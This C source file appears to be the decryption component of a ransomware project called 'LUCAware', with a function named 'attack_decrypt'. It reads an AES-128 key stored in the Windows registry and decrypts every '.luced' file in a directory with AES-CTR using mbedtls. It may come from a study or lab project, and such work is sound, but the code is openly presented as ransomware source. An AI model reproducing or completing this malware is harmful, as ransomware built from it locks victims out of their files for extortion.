/*  This file containes the code for the Encryption Module of LUCA. It provides methods for file and directory decryption. */
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winreg.h>
#include <string.h>
#include <dirent.h>
#include <mbedtls/aes.h>

#include "store_in_register.h"
#include "get_relative_path.h"

#define REG_PATH "Software\\LUCAware"
#define DECRYPTION_KEY_NAME "DecryptionKey"

/* Constant values for AES 128 */
#define AES_KEY_SIZE 16
#define IV_SIZE 16
#define BUFFER_SIZE 4096

/* Error handling */
void handle_error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

/* Decrypt one file with the plaintext AES key */
void decrypt_file(const char *source, const char *target, const unsigned char *key) {
    // Open input output files
    FILE *in = fopen(source, "rb");
    if (!in)
        handle_error("Cannot open input file");

    FILE *out = fopen(target, "wb");
    if (!out)
        handle_error("Cannot open output file");

    // Variables for keys and stream
    unsigned char iv[IV_SIZE];
    unsigned char nonce_counter[IV_SIZE];
    unsigned char stream_block[16] = {0};
    size_t nc_off = 0;

    // Read plaintext IV from the file beginning
    if (fread(iv, 1, IV_SIZE, in) != IV_SIZE)
        handle_error("Failed to read IV");

    memcpy(nonce_counter, iv, IV_SIZE);

    // Setup mbedtls
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);

    if (mbedtls_aes_setkey_enc(&aes, key, 128) != 0)
        handle_error("AES key setup failed");

    // Decryption
    unsigned char buffer[BUFFER_SIZE];
    size_t n;

    while ((n = fread(buffer, 1, BUFFER_SIZE, in)) > 0) {
        if (mbedtls_aes_crypt_ctr(&aes, n, &nc_off, nonce_counter, stream_block, buffer, buffer) != 0)
            handle_error("AES-CTR decryption failed");

        if (fwrite(buffer, 1, n, out) != n)
            handle_error("Failed to write decrypted data");
    }

    // Cleanup
    mbedtls_aes_free(&aes);
    fclose(in);
    fclose(out);
}

// Decrypt all .luced files in the target directory
void decrypt_all_myenc_files_in_dir(const char *files_dir, const unsigned char *key) {
    // Open dircetory
    DIR *dir = opendir(files_dir);
    if (!dir)
        handle_error("Cannot open directory");

    // Variables for .luced file handling
    struct dirent *entry;
    char source_path[1024];
    char target_path[1024];
    const char *extension = ".luced";
    size_t ext_len = strlen(extension);

    while ((entry = readdir(dir)) != NULL) {
        // Skip "." and ".."
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        size_t name_len = strlen(entry->d_name);

        // Only process files ending with ".luced"
        if (name_len <= ext_len || strcmp(entry->d_name + name_len - ext_len, extension) != 0)
            continue;

        // Build full source path
        snprintf(source_path, sizeof(source_path), "%s\\%s", files_dir, entry->d_name);

        // Build target path by stripping ".luced"
        snprintf(target_path, sizeof(target_path), "%s\\%.*s", files_dir, (int)(name_len - ext_len), entry->d_name);

        // Decrypt the file
        decrypt_file(source_path, target_path, key);
    }

    // Close directory
    closedir(dir);
}

/* Public API for files decryption */
int attack_decrypt() {
    storage_context_t ctx = { REG_PATH };

    /* Load AES key from registry */
    unsigned char key[AES_KEY_SIZE];
    if (load_value(&ctx, DECRYPTION_KEY_NAME, key, AES_KEY_SIZE) != 0) {
        return -1;
    }

    // Temporary - decrypt .lucde files in /build
    char build_dir[MAX_PATH];
    if (get_relative_path(build_dir, sizeof(build_dir), "") != 0) {
        return -1;
    }
    // Decrypt all files
    decrypt_all_myenc_files_in_dir(build_dir, key);

    return 0;
}
